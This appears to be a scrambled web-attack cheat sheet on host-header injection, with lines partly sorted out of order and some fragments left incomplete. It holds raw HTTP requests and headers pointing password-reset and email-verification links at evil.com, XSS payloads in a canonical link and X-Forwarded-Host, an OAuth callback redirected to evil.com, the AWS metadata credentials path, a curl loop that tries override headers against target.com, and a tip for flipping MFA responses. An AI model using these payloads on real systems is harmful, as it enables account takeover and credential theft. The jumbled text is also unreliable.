<link rel="canonical" href="https://evil.com"><script>alert(document.domain)</script>/"/>
Content-Type: application/x-www-form-urlencoded
Forwarded: host=evil.com
GET /
GET / HTTP/1.1
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
GET /oauth/authorize?response_type=code&client_id=app HTTP/1.1
POST /forgot-password HTTP/1.1
Reset your password: https://evil.com/reset?token=abc123def456
USE_X_FORWARDED_HOST = True
Verify your email: https://evil.com/verify?token=TOKEN
X-Forwarded-Host: evil.com"><script>alert(document.domain)</script>
X-Original-URL: /
X-Rewrite-URL: /
curl -s -I "https://target.com/forgot-password" \
echo "=== $H ==="
email=victim@company.com
for H in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
https://evil.com/oauth/callback?code=AUTH_CODE
# ─── host-header poisoning for password reset (skraft9/vulnerability-research) ───
# Reset link built from Host header — attacker gets the reset link:
POST /api/reset-password HTTP/1.1
Host: evil.com
Content-Type: application/json
{"email":"victim@target.com"}
# Alternate header the same trick abuses:
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
# ─── MFA response tampering (skraft9/vulnerability-research) ───
# Proxy intercept: {success:false, mfa_required:true} → flip to {success:true, status:200}
# Some SPAs trust response.data.success blindly
